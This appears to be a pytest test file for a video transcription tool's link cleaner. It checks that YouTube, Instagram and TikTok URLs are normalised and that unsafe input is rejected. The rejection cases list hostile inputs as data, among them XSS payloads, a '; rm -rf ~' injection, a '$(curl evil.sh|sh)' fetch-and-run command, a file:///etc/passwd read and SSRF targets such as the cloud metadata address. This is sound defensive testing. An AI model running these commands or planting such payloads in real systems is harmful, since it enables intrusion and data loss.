import pytest

from video_transcriptor.errors import TranscriptionError
from video_transcriptor.links import clean_link


@pytest.mark.parametrize("raw,expected", [
    ("https://www.youtube.com/watch?v=jNQXAC9IVRw", "https://www.youtube.com/watch?v=jNQXAC9IVRw"),
    ("https://m.youtube.com/watch?v=jNQXAC9IVRw&list=PL123&t=42s&si=track",
     "https://www.youtube.com/watch?v=jNQXAC9IVRw"),
    ("https://youtube.com/shorts/Xu-QfE_1ksk?feature=share", "https://www.youtube.com/shorts/Xu-QfE_1ksk"),
    ("youtu.be/jNQXAC9IVRw?si=abc", "https://youtu.be/jNQXAC9IVRw"),
    ("http://www.instagram.com/reel/DfKfQNPotER/?hvrq=anhyeTFhaXRhd3ph&igsh=x",
     "https://www.instagram.com/reel/DfKfQNPotER/"),
    ("https://instagram.com/someuser/reel/DfKfQNPotER", "https://www.instagram.com/reel/DfKfQNPotER/"),
    ("https://www.tiktok.com/@bbcnews/video/7711038040734469398?is_from_webapp=1&sender_device=pc",
     "https://www.tiktok.com/@bbcnews/video/7711038040734469398"),
    ("https://vm.tiktok.com/ZMabc123/", "https://vm.tiktok.com/ZMabc123/"),
    ("  https://www.youtube.com/watch?v=jNQXAC9IVRw  ", "https://www.youtube.com/watch?v=jNQXAC9IVRw"),
])
def test_valid_links_are_normalised(raw, expected):
    assert clean_link(raw) == expected


def test_fragment_is_removed_so_nothing_can_be_smuggled():
    smuggled = 'https://www.youtube.com/watch?v=jNQXAC9IVRw#__youtubedl_smuggle=%7B%22http_headers%22%3A%7B%7D%7D'
    assert "#" not in clean_link(smuggled)


@pytest.mark.parametrize("raw,title", [
    # not a link / injection attempts
    ("", "No link"),
    ("hello there", "That's not a valid link"),
    ('"><script>alert(1)</script>', "That's not a valid link"),
    ("https://www.youtube.com/watch?v=jNQXAC9IVRw\"><img src=x onerror=alert(1)>", "That's not a valid link"),
    ("https://www.youtube.com/watch?v=abc; rm -rf ~", "That's not a valid link"),
    ("https://www.youtube.com/watch?v=jNQXAC9IVRw\nhttps://evil.example", "That's not a valid link"),
    ("$(curl evil.sh|sh)", "That's not a valid link"),
    ("javascript:alert(1)", "That's not a web link"),
    ("file:///etc/passwd", "That's not a web link"),
    ("ytsearch:cats", "That's not a web link"),
    ("ftp://www.youtube.com/watch?v=jNQXAC9IVRw", "That's not a web link"),
    ("https://" + "a" * 3000, "Link too long"),
    # other sites, local network, tricks with hosts
    ("https://example.com/video.mp4", "This link isn't supported"),
    ("http://127.0.0.1:8765/api/transcripts", "This link isn't supported"),
    ("http://localhost/", "This link isn't supported"),
    ("http://192.168.1.1/admin", "This link isn't supported"),
    ("http://169.254.169.254/latest/meta-data/", "This link isn't supported"),
    ("https://youtube.com.evil.example/watch?v=jNQXAC9IVRw", "This link isn't supported"),
    ("https://evil-youtube.com/watch?v=jNQXAC9IVRw", "This link isn't supported"),
    ("https://user:pass@www.youtube.com/watch?v=jNQXAC9IVRw", "This link isn't supported"),
    ("https://www.youtube.com:8080/watch?v=jNQXAC9IVRw", "This link isn't supported"),
    # supported sites, but not a single video
    ("https://www.youtube.com/watch", "That's not a video"),
    ("https://www.youtube.com/@YouTube", "That's not a video"),
    ("https://www.youtube.com/playlist?list=PL123", "That's not a video"),
    ("https://www.instagram.com/nosop3/", "That's not a video"),
    ("https://www.instagram.com/stories/someone/123/", "That's not a video"),
    ("https://www.tiktok.com/@nba", "That's not a video"),
    ("https://www.tiktok.com/@nba/photo/7711038040734469398", "That's not a video"),
    ("https://www.youtube.com/watch?v=abc", "The link is incomplete"),
])
def test_bad_links_are_rejected_with_a_clear_reason(raw, title):
    with pytest.raises(TranscriptionError) as info:
        clean_link(raw)
    assert info.value.title == title and info.value.kind == "link"
